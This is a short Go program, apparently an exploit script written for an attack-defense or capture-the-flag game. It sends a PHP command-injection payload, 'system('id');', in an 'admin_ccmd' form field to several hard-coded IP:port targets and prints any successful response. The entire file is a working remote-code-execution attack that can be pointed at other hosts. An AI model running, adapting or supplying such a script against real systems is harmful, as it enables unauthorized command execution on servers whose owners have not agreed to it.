package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
)

func main() {
	target := [...]string{
		"1.94.188.98:48248",
		"1.94.188.98:48774",
		"1.94.188.98:48778",
		"1.94.188.98:48778",
		"1.94.188.98:49170",
	}
	payload := "system('id');"
	values := url.Values{}
	values.Add("admin_ccmd", payload)
	for _, s := range target {
		req, err := http.Post(fmt.Sprintf("http://%s", s), "application/x-www-form-urlencoded", strings.NewReader(values.Encode()))
		if err != nil {
			fmt.Println(err)
			continue
		}
		resp, _ := io.ReadAll(req.Body)
		if req.StatusCode == 200 {
			fmt.Println(string(resp))
		}
	}

}
